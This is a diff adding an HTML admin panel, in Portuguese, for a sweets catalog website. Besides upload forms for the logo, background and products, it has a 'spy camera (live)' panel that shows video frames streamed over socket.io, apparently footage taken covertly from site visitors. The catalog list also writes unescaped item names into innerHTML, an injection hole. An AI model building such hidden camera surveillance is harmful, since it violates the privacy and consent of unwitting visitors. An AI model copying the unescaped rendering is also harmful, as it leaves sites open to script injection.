@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Admin</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; }
+        .container { display: flex; gap: 20px; flex-wrap: wrap; }
+        .panel { background: white; padding: 20px; border-radius: 10px; flex: 1; min-width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input[type="text"], input[type="file"] { width: 100%; padding: 8px; box-sizing: border-box; }
+        button { background: #4CAF50; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 5px; }
+        .danger { background: #f44336; width: auto; padding: 5px 10px; }
+        .item-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #ddd; }
+        .item-info { display: flex; align-items: center; gap: 10px; }
+        img.preview { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
+        #liveStream { width: 100%; background: #000; min-height: 250px; object-fit: contain; }
+        hr { border: 1px solid #eee; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>Painel de Controle</h1>
+    <div class="container">
+        
+        <div class="panel">
+            <h2>Configurar Visual</h2>
+            <form id="logoForm">
+                <div class="form-group">
+                    <label>Logo (Substitui o texto 'Brigadeiros'):</label>
+                    <input type="file" id="logoFile" accept="image/*" required>
+                </div>
+                <button type="submit">Atualizar Logo</button>
+            </form>
+            <br>
+            <form id="bgForm">
+                <div class="form-group">
+                    <label>Imagem de Fundo (A textura da caixinha):</label>
+                    <input type="file" id="bgFile" accept="image/*" required>
+                </div>
+                <button type="submit">Atualizar Fundo</button>
+            </form>
+
+            <hr>
+
+            <h2>Adicionar Doce</h2>
+            <form id="addItemForm">
+                <div class="form-group">
+                    <label>Nome do Doce:</label>
+                    <input type="text" id="itemName" required>
+                </div>
+                <div class="form-group">
+                    <label>Foto:</label>
+                    <input type="file" id="itemImage" accept="image/*" required>
+                </div>
+                <button type="submit">Adicionar ao Catálogo</button>
+            </form>
+
+            <div id="adminCatalog" style="margin-top: 20px;"></div>
+        </div>
+
+        <div class="panel">
+            <h2>Câmera Espiã (Ao Vivo)</h2>
+            <img id="liveStream" alt="Aguardando conexão..." />
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        
+        socket.on('streamVideo', (frame) => {
+            document.getElementById('liveStream').src = frame;
+        });
+
+        socket.on('updateCatalog', (items) => {
+            document.getElementById('adminCatalog').innerHTML = items.map(item => `
+                <div class="item-row">
+                    <div class="item-info">
+                        <img src="${item.image}" class="preview">
+                        <span>${item.name}</span>
+                    </div>
+                    <button class="danger" onclick="removeItem(${item.id})">Remover</button>
+                </div>
+            `).join('');
+        });
+
+        async function uploadFile(url, formData, btn) {
+            btn.disabled = true;
+            btn.textContent = 'Enviando...';
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Atualizar';
+            }
+        }
+
+        document.getElementById('logoForm').onsubmit = (e) => {
+            e.preventDefault();
+            const fd = new FormData();
+            fd.append('logo', document.getElementById('logoFile').files[0]);
+            uploadFile('/api/upload-logo', fd, e.target.querySelector('button'));
+        };
+
+        document.getElementById('bgForm').onsubmit = (e) => {
+            e.preventDefault();
+            const fd = new FormData();
+            fd.append('background', document.getElementById('bgFile').files[0]);
+            uploadFile('/api/upload-background', fd, e.target.querySelector('button'));
+        };
+
+        document.getElementById('addItemForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const fd = new FormData();
+            fd.append('name', document.getElementById('itemName').value);
+            fd.append('image', document.getElementById('itemImage').files[0]);
+            await uploadFile('/api/add-item', fd, e.target.querySelector('button'));
+            e.target.reset();
+        };
+
+        function removeItem(id) {
+            if(confirm('Remover?')) fetch('/api/remove-item', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id })
+            });
+        }
+    </script>
+</body>
+</html>
